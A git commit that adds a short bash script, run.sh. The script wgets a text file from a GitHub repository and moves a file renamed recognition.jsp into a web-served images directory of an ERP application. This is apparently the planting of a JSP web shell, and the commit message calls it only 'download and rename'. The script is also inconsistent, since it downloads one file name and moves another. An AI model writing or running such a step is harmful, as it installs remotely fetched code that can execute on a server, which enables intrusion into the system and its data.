a73d417deec60508e8ad3e8fa0157d609602e949
zzz118873-cmd <zzz118873@gmail.com>
2026-03-09 09:51:09 +0800

    Add script to download and rename a file
    Download a file and rename it to recognition.jsp.

---
+++ run.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+
+echo "下载文件"
+wget https://github.com/zzz118873-cmd/cmsee/raw/refs/heads/main/sadge1dc1g34141.txt
+
+echo "修改文件名字"
+mv 1.txt /home/erpadmin/workspace/ERP4/themes/common/webapp/images/recognition.jsp
